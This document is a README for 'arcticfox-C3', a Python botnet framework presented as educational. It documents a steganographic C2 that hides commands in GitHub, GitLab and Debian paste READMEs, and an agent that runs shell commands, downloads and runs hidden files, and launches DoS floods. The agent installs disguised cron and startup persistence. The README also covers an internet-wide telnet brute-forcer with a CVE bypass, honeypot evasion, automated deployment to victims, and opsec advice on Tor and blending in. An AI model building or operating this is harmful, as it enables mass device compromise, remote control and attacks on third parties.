# arcticfox-C3
> Educational C3 framework demonstrating **C2-free botnets** using GitHub, GitLab, and Debian paste dead-drops with zero-width Unicode steganography.

arcticfox-C3 is a proof-of-concept Python framework showing how modern botnets operate without traditional C2 servers. Commands are hidden in invisible zero-width Unicode characters inside ordinary README files. No listening ports, no custom protocols, no network signatures.

---

## Architecture

```
┌─────────────────┐         ┌─────────────────────────────┐
│  Operator        │         │  Dead-Drop Repos            │
│  (API / control) │────────▶│  GitHub / GitLab / Debian   │
│                  │  push   │  README.md with ZW payload  │
└─────────────────┘         └──────────────┬──────────────┘
                                           │ poll (random order)
                                           ▼
                            ┌─────────────────────────────┐
                            │  Agents (pastebomb.py)       │
                            │  - Decode ZW commands        │
                            │  - Execute & persist         │
                            │  - Heartbeat via redirect    │
                            │  - Failover on 404          │
                            └─────────────┬───────────────┘
                                          │ heartbeat
                                          ▼
                            ┌─────────────────────────────┐
                            │  Dashboard API (api.py)      │
                            │  - Admin: full C2 control    │
                            │  - Lints: bot monitoring     │
                            │  - Heartbeat receiver        │
                            └─────────────────────────────┘
```

---

## Features & Capabilities

### REST API Dashboard (`api.py`)

**Admin role** — full C2 control:
- Add, remove, list, and health-check dead-drop repos
- Queue, list, remove, and clear commands
- Push ZW-encoded payloads to all repos or specific targets
- Pull and decode existing payloads from repos
- Preview payload JSON with byte/ZW-char counts
- Create new Debian paste dead-drops on-demand
- Configure heartbeat redirect URL, tracking endpoint, and interval
- Set/rotate GitHub and GitLab API tokens
- Toggle 1MB zero-width padding
- View all connected bots (IP, first/last seen, hit count, alive status)
- Remove stale bots
- Dashboard stats (bots alive/total, repos alive/total, commands queued)
- Save config to disk

**Lints role** — read-only monitoring:
- View overall status summary
- List connected bots with activity info
- List repos and their health
- View currently queued commands

**Heartbeat receiver** — unauthenticated bot check-in:
- Bots hit `/api/heartbeat/<hash>` to register presence
- Tracks IP, first seen, last seen, total hits
- Persists bot data to `bots.json`

**Security:**
- Bearer token authentication (admin and lints tokens)
- Tokens auto-generated on first run
- Role-based access control (lints blocked from write operations)
- `--gen-tokens` flag to rotate credentials

---

### Zero-Width Unicode C2 Protocol (`zwenc.py`)

- Base-4 encoding using 4 invisible Unicode characters per byte:
  - U+200B Zero Width Space = 0
  - U+200C Zero Width Non-Joiner = 1
  - U+200D Zero Width Joiner = 2
  - U+FEFF Zero Width No-Break Space = 3
- Start/end markers (8 ZW chars each) delimit payload
- Payload injected into first `#` heading of README — invisible in rendered markdown
- Existing README content preserved (only ZW chars added)
- Optional 1MB random ZW padding after end marker (anti-analysis)
- Encode, decode, inject, extract, and strip functions

---

### Operator Control Tool (`control.py`)

- Interactive shell with full command set
- CLI mode for scripted pushes (`--push`, `--cmd`, `--pad`, `--check`)
- Push ZW-encoded payloads to GitHub, GitLab, and Debian paste repos
- Pull and decode payloads from any repo
- Multi-repo management with health checks (404 detection)
- Heartbeat URL builder (open redirect + URL-encoded tracking)
- Bland randomized commit messages ("docs: update readme", "fix typo", etc.)
- Debian paste creation via paste.debian.net API
- Config persistence to JSON

---

### C2 Agent (`pastebomb.py`)

**Command polling:**
- Polls public repos for ZW-encoded commands
- Multi-repo fallback with randomized order each cycle
- 404 pre-check (HEAD request) before fetching
- Exponential backoff on repeated failures
- Dynamic repo discovery — learns new sources from payload
- Legacy format support (marker tags, code blocks, base64)
- Command deduplication via hash (won't re-execute same payload)

**Agent commands:**
| Command | Description |
|---------|-------------|
| `cmd <shell>` / `shell <shell>` | Execute shell command |
| `download <url> <dest> [RUN] [HIDE]` | Download file, optionally execute or hide |
| `dos <ip> <port> <seconds>` | Network flood (max 300s) |
| `popmsg <message>` | Open HTML popup in browser |
| `add_repo [gh:\|gl:\|dp:]<repo>` | Add fallback repo source |
| `set_interval <seconds>` | Change poll interval |
| `sleep <seconds>` | Sleep before next poll |
| `die` | Kill agent |

**Heartbeat:**
- Heartbeat via open-redirect server (no direct C2 IP exposure)
- URL-encoded tracking endpoint inside redirect URL
- Randomized padded hash per heartbeat (random 16-byte prefix + SHA256)
- Configurable interval, runs in background thread

**Persistence:**
- Cross-platform: Windows startup folder, Linux autostart, macOS LaunchAgents
- Cron job persistence (Linux) — re-runs agent every 14 days if killed
- Disguised cron entry (appears as system maintenance task)
- Daemon mode (`--daemon`) for background operation

**Stealth:**
- Bot ID stored in hidden files named after Linux system tools (systemd, cron, bash, sshd, networkd, apt, dpkg, iptables, journald, udev)
- Randomized padded bot hash — different every heartbeat, no static fingerprint
- Jitter on poll interval prevents timing correlation
- Cache-busting on all fetches

**Deployment:**
- Telnet-based agent deployment to compromised targets
- Deploys both `pastebomb.py` and `zwenc.py` automatically
- Injects repo config so agents phone home immediately
- Pre-deployment honeypot check (skips honeypots)
- Batch deployment from target file with parallel honeypot scan

---

### Telnet Scanner & Brute-Forcer (`csan.py`)

- Async telnet port scanner with configurable thread count
- Credential brute-forcer with 35 common IoT credentials
- CVE-2026-24061 telnet authentication bypass
- Honeypot detection: banner-based (cowrie, HoneyTel, Kippo, etc.)
- Scoped scanning (CIDR, file, single IP) or random internet scanning
- Configurable ports, timeouts, thread counts, rate limiting
- Exclusion lists (skip CIDRs)
- Output to file with structured results
- **Proxy support** — route scans and brute-force through SOCKS5, SOCKS4, or HTTP CONNECT proxies
  - Single proxy: `--proxy socks5://host:port`
  - Proxy list with round-robin rotation: `--proxy-file proxies.txt`
  - SOCKS5 authentication: `--proxy socks5://user:pass@host:port`
  - Config file: `proxy_list` array in `oogascan.json`
  - Zero external dependencies (built-in SOCKS5/4/HTTP CONNECT handshake)

---

### Honeypot Detection

Two layers:
1. **Banner-based** (scanner): Detects known honeypot strings in telnet banners
2. **Port-count** (deployment): If 11+ of 15 common ports are open, target is flagged as honeypot

Port-count checks run async in parallel across all targets before deployment begins.

---

## Project Structure

```
snowfox-c3/
├── api.py               REST API for admin & lints dashboards
├── oogascan.py          Unified entry point (scan / c2 / control / api / config)
├── pastebomb.py         C2 agent + server + deployer
├── control.py           Operator control tool (interactive + CLI)
├── zwenc.py             Zero-width Unicode codec
├── csan.py              Telnet scanner & brute-forcer
├── config.py            Shared scanner configuration
├── oogascan.json        Scanner settings
├── pb_config.json       Agent C2 configuration
├── control_config.json  Operator config (repos, tokens, heartbeat)
├── api_config.json      API server config (tokens, host, port)
├── requirements.txt     Python dependencies
├── CHANGELOG.md         Version history
└── LICENSE              MIT License
```

---

## Quick Start

### 1. Install dependencies

```bash
pip install -r requirements.txt
```

### 2. Start the API dashboard

```bash
python3 api.py
```

Tokens are printed on first run. Use them in the `Authorization: Bearer <token>` header.

### 3. Configure via API (admin)

```bash
TOKEN="your-admin-token"

# Add repos
curl -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"repo":"gh:youruser/c2-repo"}' \
  http://localhost:7443/api/admin/repos

# Add commands
curl -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"cmd":"shell whoami"}' \
  http://localhost:7443/api/admin/commands

# Set heartbeat
curl -X PUT -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"redirect":"https://redirect.example.com/r?u={target}","tracking":"http://localhost:7443/api/heartbeat/{id}","interval":120}' \
  http://localhost:7443/api/admin/heartbeat

# Set GitHub token
curl -X PUT -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"github_token":"ghp_your_token"}' \
  http://localhost:7443/api/admin/tokens

# Push to all repos
curl -X POST -H "Authorization: Bearer $TOKEN" \
  http://localhost:7443/api/admin/push
```

### 4. Or use the interactive control tool

```bash
python3 control.py
```

### 5. Run the agent (target side)

```bash
# Foreground with verbose output
python3 pastebomb.py agent -r youruser/c2-repo -v

# Daemon mode
python3 pastebomb.py agent -c pb_config.json --daemon
```

### 6. Monitor bots via API (lints)

```bash
LINTS_TOKEN="your-lints-token"

curl -H "Authorization: Bearer $LINTS_TOKEN" \
  http://localhost:7443/api/lints/bots

curl -H "Authorization: Bearer $LINTS_TOKEN" \
  http://localhost:7443/api/lints/status
```

### 7. Scan for targets

```bash
python3 oogascan.py scan -T 192.168.1.0/24
python3 oogascan.py scan --scan-only --ports 23,2323

# Scan through a proxy
python3 oogascan.py scan -T 192.168.1.0/24 --proxy socks5://127.0.0.1:9050
python3 oogascan.py scan --proxy socks5://user:pass@proxy.example.com:1080
python3 oogascan.py scan --proxy-file proxies.txt   # round-robin rotation
```

---

## Usage Guide

### Continuous Scan + Auto-Deploy (Full Pipeline)

Run the scanner and deployer in parallel — the scanner finds targets forever, the deployer watches the results file and pushes agents to new victims continuously.

**Terminal 1 — Random internet scan (runs forever):**

```bash
python3 oogascan.py scan -p 23,2323 -t 16 -b 16 -o output -v
```

With no `-T` target, the scanner defaults to random internet scanning (0.0.0.0) and runs indefinitely until Ctrl+C. Pwned hosts stream into `output/results.jsonl` in real time.

**Terminal 2 — Deploy loop (watches results, deploys continuously):**

```bash
while true; do
  python3 oogascan.py c2 deploy -f output/results.jsonl \
    -r youruser/c2-repo -r gl:youruser/backup-repo -v
  sleep 120
done
```

Loops every 2 minutes, reads new results from the scanner output, runs honeypot port-count checks, and deploys the agent + zwenc to clean targets via telnet.

### Scan + Deploy with Proxies

```bash
# Scanner through Tor
python3 oogascan.py scan -p 23,2323 -t 8 -b 8 \
  --proxy socks5://127.0.0.1:9050 -o output -v

# Rotate through multiple proxies
python3 oogascan.py scan -p 23,2323 -t 8 -b 8 \
  --proxy-file proxies.txt -o output -v
```

Proxy file format (one per line):
```
socks5://127.0.0.1:9050
socks5://user:pass@proxy2.example.com:1080
socks4://proxy3.example.com:4145
http://proxy4.example.com:8080
```

### Scoped Scanning (Specific Targets)

```bash
# Single subnet
python3 oogascan.py scan -T 192.168.1.0/24 -p 23,2323 -v

# Multiple targets
python3 oogascan.py scan -T 10.0.0.0/8 -T 172.16.0.0/12 -p 23

# From a file (one IP/CIDR per line)
python3 oogascan.py scan -T targets.txt -p 23,2323

# With exclusions
python3 oogascan.py scan -T 10.0.0.0/8 -x 10.0.0.0/24 -x 10.1.0.0/16

# Scan only (no brute-force, just find open ports)
python3 oogascan.py scan -T 192.168.1.0/24 --scan-only

# Skip CVE bypass, brute-force only
python3 oogascan.py scan -T 192.168.1.0/24 --no-bypass

# Custom credentials
python3 oogascan.py scan -T 192.168.1.0/24 --creds my_creds.txt

# Rate-limited
python3 oogascan.py scan -T 192.168.1.0/24 --rate-limit 50
```

### Scanner Tuning Flags

| Flag | Default | Description |
|------|---------|-------------|
| `-t, --threads` | 2x CPUs | Scanner threads (port checking) |
| `-b, --brute-threads` | 2x CPUs | Brute-force/bypass worker threads |
| `-p, --ports` | `23,2323` | Comma-separated ports to scan |
| `--rate-limit` | `0` (unlimited) | Max scans/second per thread |
| `--scan-only` | off | Only find open ports, skip brute-force |
| `--no-bypass` | off | Skip CVE-2026-24061, go straight to brute |
| `--proxy` | none | Single proxy URL |
| `--proxy-file` | none | Proxy list file (round-robin rotation) |
| `--creds` | built-in 35 | Custom credentials file (`user:pass` per line) |
| `-o, --output` | `output/` | Output directory for results |

### Agent Operation

```bash
# Run agent with repos from CLI (foreground, verbose)
python3 oogascan.py c2 agent -r youruser/c2-repo -r gl:youruser/backup -v

# Run as background daemon with config file
python3 oogascan.py c2 agent -c pb_config.json --daemon

# Agent with custom poll interval and API mode
python3 oogascan.py c2 agent -r youruser/repo -i 30 --api

# Skip persistence installation
python3 oogascan.py c2 agent -r youruser/repo --no-persist --daemon
```

### Operator Workflow (Control Tool)

```bash
# Interactive shell
python3 oogascan.py control

# Non-interactive: push commands to repos
python3 oogascan.py control --push \
  -r gh:youruser/c2-repo -r gl:youruser/backup \
  --cmd "shell whoami" --cmd "shell id"

# With 1MB ZW padding
python3 oogascan.py control --push -r youruser/repo --cmd "shell uname -a" --pad

# Check repo health
python3 oogascan.py control --check -r youruser/repo1 -r youruser/repo2
```

### API Server

```bash
# Start on default port 7443
python3 oogascan.py api

# Custom host/port
python3 oogascan.py api -H 127.0.0.1 -p 8443

# Regenerate tokens
python3 api.py --gen-tokens

# Debug mode (auto-restricted to localhost)
python3 api.py --debug
```

### Payload Generation (Server Shell)

```bash
python3 oogascan.py c2 server
```

Inside the server shell:
```
pb> cmd shell whoami
pb> cmd shell cat /etc/passwd
pb> cmd download http://example.com/tool /tmp/tool RUN HIDE
pb> list                    # show queued commands
pb> genzw                   # generate README with ZW encoding (preferred)
pb> genzw pad               # same with 1MB padding
pb> gen                     # generate with marker tags
pb> gen64                   # generate with base64
pb> clear                   # clear command queue
pb> exit
```

### Full Automated Pipeline Example

```bash
# 1. Generate config
python3 oogascan.py config

# 2. Start API dashboard
python3 oogascan.py api &

# 3. Configure repos and commands via API
TOKEN="your-admin-token"
curl -X POST -H "Authorization: Bearer $TOKEN" \
  -d '{"repo":"gh:youruser/c2-repo"}' \
  http://localhost:7443/api/admin/repos
curl -X POST -H "Authorization: Bearer $TOKEN" \
  -d '{"cmd":"shell whoami"}' \
  http://localhost:7443/api/admin/commands
curl -X PUT -H "Authorization: Bearer $TOKEN" \
  -d '{"github_token":"ghp_your_token"}' \
  http://localhost:7443/api/admin/tokens
curl -X POST -H "Authorization: Bearer $TOKEN" \
  http://localhost:7443/api/admin/push

# 4. Scan the internet (runs forever)
python3 oogascan.py scan -p 23,2323 -t 16 -b 16 -o output -v &

# 5. Deploy loop (watches scanner results)
while true; do
  python3 oogascan.py c2 deploy -f output/results.jsonl \
    -r youruser/c2-repo -v
  sleep 120
done

# 6. Monitor bots
curl -H "Authorization: Bearer $TOKEN" \
  http://localhost:7443/api/admin/bots
```

---

## API Reference

### Authentication

All endpoints (except `/api/heartbeat/*`) require a Bearer token:
```
Authorization: Bearer <token>
```

Tokens are stored in `api_config.json`. Regenerate with:
```bash
python3 api.py --gen-tokens
```

### Admin Endpoints

| Method | Endpoint | Description |
|--------|----------|-------------|
| GET | `/api/admin/repos` | List all repos |
| POST | `/api/admin/repos` | Add repo `{"repo": "gh:user/repo"}` |
| DELETE | `/api/admin/repos/<idx>` | Remove repo by index |
| POST | `/api/admin/repos/check` | Health-check all repos |
| GET | `/api/admin/commands` | List queued commands |
| POST | `/api/admin/commands` | Add command `{"cmd": "shell id"}` |
| DELETE | `/api/admin/commands` | Clear all commands |
| DELETE | `/api/admin/commands/<idx>` | Remove single command |
| POST | `/api/admin/push` | Push payload to repos `{"index": N, "pad": bool}` |
| GET | `/api/admin/pull/<idx>` | Decode payload from repo |
| GET | `/api/admin/preview` | Preview payload JSON |
| POST | `/api/admin/paste` | Create Debian paste dead-drop |
| GET | `/api/admin/heartbeat` | Get heartbeat config |
| PUT | `/api/admin/heartbeat` | Set heartbeat config |
| PUT | `/api/admin/tokens` | Set GitHub/GitLab tokens |
| PUT | `/api/admin/padding` | Toggle 1MB padding `{"enabled": bool}` |
| POST | `/api/admin/config/save` | Persist config to disk |
| GET | `/api/admin/bots` | List all bots |
| DELETE | `/api/admin/bots/<id>` | Remove bot |
| GET | `/api/admin/stats` | Dashboard summary |

### Lints Endpoints

| Method | Endpoint | Description |
|--------|----------|-------------|
| GET | `/api/lints/status` | Overview stats |
| GET | `/api/lints/bots` | List bots (read-only) |
| GET | `/api/lints/repos` | List repos (read-only) |
| GET | `/api/lints/commands` | Current commands (read-only) |

### Public Endpoints

| Method | Endpoint | Description |
|--------|----------|-------------|
| GET/POST | `/api/heartbeat/<hash>` | Bot check-in (no auth) |
| GET | `/api/auth/whoami` | Token validation |

---

## Repo Format

```
owner/repo                        GitHub (default)
gh:owner/repo                     GitHub (explicit)
gl:owner/repo                     GitLab
dp:paste_id                       Debian paste
owner/repo:branch                 Custom branch
gl:owner/repo:main/path/file.md   Custom file path
```

---

## Configuration Files

### api_config.json

```json
{
  "admin_token": "",
  "lints_token": "",
  "host": "0.0.0.0",
  "port": 7443,
  "use_pad": false
}
```

Tokens auto-generate on first run if empty.

### control_config.json

```json
{
  "github_token": "",
  "gitlab_token": "",
  "repos": [...],
  "commands": ["shell whoami"],
  "heartbeat_redirect": "https://redirect.example.com/r?u={target}",
  "heartbeat_tracking": "https://tracker.example.com/hb?id={id}",
  "heartbeat_interval": 300
}
```

### oogascan.json (scanner config)

```json
{
  "scan": {
    "ports": [23, 2323],
    "scan_timeout": 1.0,
    "brute_timeout": 20,
    "scanner_threads": 8,
    "brute_threads": 8,
    "rate_limit": 0,
    "bypass_timeout": 15,
    "honeypot_patterns": ["cowrie", "honeypot", "HoneyTel", "Kippo"],
    "proxy_list": [
      "socks5://127.0.0.1:9050",
      "socks5://user:pass@proxy2.example.com:1080",
      "http://proxy3.example.com:8080"
    ]
  },
  "creds_file": "",
  "output_dir": "output"
}
```

Proxy formats supported in `proxy_list`:
- `socks5://host:port` — SOCKS5 (no auth)
- `socks5://user:pass@host:port` — SOCKS5 with authentication
- `socks4://host:port` — SOCKS4
- `http://host:port` — HTTP CONNECT tunnel

When multiple proxies are configured, they are rotated round-robin across all scanner and brute-force threads.

### pb_config.json

```json
{
  "repos": [...],
  "poll_interval": 60,
  "jitter": 15,
  "max_fails_before_skip": 5,
  "use_api": false,
  "last_command_hash": ""
}
```

---

## Entry Points

```bash
python3 oogascan.py scan           # Telnet scanner
python3 oogascan.py c2 agent       # C2 agent
python3 oogascan.py c2 server      # Legacy README generator
python3 oogascan.py c2 deploy      # Deploy to targets
python3 oogascan.py control        # Interactive operator tool
python3 oogascan.py api            # REST API dashboard
python3 oogascan.py config         # Generate default scanner config
```

Or run modules directly:
```bash
python3 api.py                     # API server
python3 control.py                 # Operator control
python3 pastebomb.py agent         # C2 agent
python3 csan.py -T 10.0.0.0/24    # Scanner
python3 csan.py --proxy socks5://127.0.0.1:9050  # Scanner via proxy
```

---

## Operational Security Notes

- Repos should look legitimate (stars, commits, real code)
- Rotate repos periodically via `add_repo` command before retiring old ones
- Use padding (`--pad` / API toggle) to make extraction computationally expensive
- Heartbeat redirect URL should be a well-known domain (Google, Microsoft, etc.)
- Commit messages randomized from bland list
- Agent jitter prevents timing-based correlation
- Cron persistence uses system-tool names to blend with legitimate entries
- Bot ID files mimic system cache files
- API tokens should be rotated regularly (`--gen-tokens`)
- Scanner supports SOCKS5/SOCKS4/HTTP proxies — route scans through Tor or proxy chains to avoid source IP attribution
- Use `--proxy-file` with multiple proxies for round-robin rotation across workers

---

## Disclaimer

This project is for **educational and authorized security research only**. It demonstrates emerging botnet techniques for defensive research, red-team training, and academic study.

**Do not use this framework for illegal activities.** The authors are not responsible for any misuse.

---

## License

MIT License. See [LICENSE](LICENSE) for details.

---

<details>
<summary><sub>Support this project</sub></summary>
<p align="center"><br/>
If this tool saved you time, consider tossing $1 in Monero:<br/><br/>
<code>478Lb78LDscQ8ukEDTZqXgEtjoBX1jMuVGvgfy2RagxZZk89YuyVYsganfLUKnwggz8YiBxhG25yWWiHUppG9uarSiseseY</code><br/><br/>
<sub>XMR — private, untraceable, appreciated.</sub>
</p>
</details>
